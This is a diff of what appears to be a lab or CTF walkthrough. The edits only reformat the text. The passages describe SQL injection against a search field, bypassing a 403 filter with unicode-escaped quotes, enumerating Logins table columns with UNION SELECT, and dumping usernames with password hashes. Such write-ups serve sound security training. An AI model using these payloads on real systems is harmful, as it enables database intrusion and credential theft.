@@ -96,7 +96,9 @@ Using Burp Suite and sending a search request caught by the proxy interceptor to
 
 Sending a quote character in the name field results in a "403 Forbidden" being returned. If we encode it as UTF-16 and send the encoded character "\u0027", it comes back with a 200 OK. To confirm that this is injectable, we will send the input "' or 1=1-- -". This will add a clause to the query being used by the application that will always be true and so we would expect all of the results to be returned. To send that, we need to send the encoded form:
 
+```bash
 "\u0027\u0020\u006f\u0072\u0020\u0031\u003d\u0031\u002d\u002d\u0020\u002d"
+```
 
 Sending this in Burp, we do indeed get all of the results back.
 
@@ -223,7 +225,8 @@ So we have confirmed that it is SQL Server and the database name is Hub\_DB. We 
 This gives us two tables, Colleauges and Logins. Let's look at Logins and find the column names:
 
 ```bash
-> a' UNION SELECT 1,name,3,4,5 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name = 'Logins')-- -
+> a' UNION SELECT 1,name,3,4,5 FROM syscolumns WHERE id=(SELECT id 
+ FROM sysobjects WHERE name = 'Logins')-- -
 …
 [
  {
@@ -260,14 +263,16 @@ This returns three columns: id, password and username. We can now select all con
  "email": "4",
  "id": 1,
  "name": "aldom",
- "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
+ "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e860
+ 60e768d97be2d20d79dbccbe242c2244e5739",
  "src": "5"
  },
  {
  "email": "4",
  "id": 1,
  "name": "alyx",
- "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
+ "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2
+ f244f7fc80dd2928e648465b8e7a1946a50cfa",
  "src": "5"
  },
 …
